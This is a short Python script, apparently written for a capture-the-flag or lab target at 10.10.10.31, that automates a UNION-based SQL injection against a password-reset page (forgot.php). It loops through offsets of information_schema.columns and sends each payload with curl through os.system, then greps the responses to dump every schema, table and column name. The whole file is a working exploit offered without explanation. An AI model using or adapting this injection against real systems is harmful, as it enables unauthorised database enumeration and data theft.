from subprocess import call;
import os;
i=0;
while(i<100):
    payload="email=gg@gmail.com' UniOn select 1,2,3,CONCAT(table_schema,':',table_name,':',column_name,':','gg@g.com') from information_schema.columns where table_schema != 'information_schema' limit 1 offset "+str(i)+"  -- -"
    #print payload
    #payload="hi"
    i=i+1;
    x='curl -s -d "'+payload+'" http://10.10.10.31/cmsdata/forgot.php| grep -o "[^ ]*@g.com"'
    #print x;
    #ret=call(["curl -s",x],shell=True)
    os.system(x);
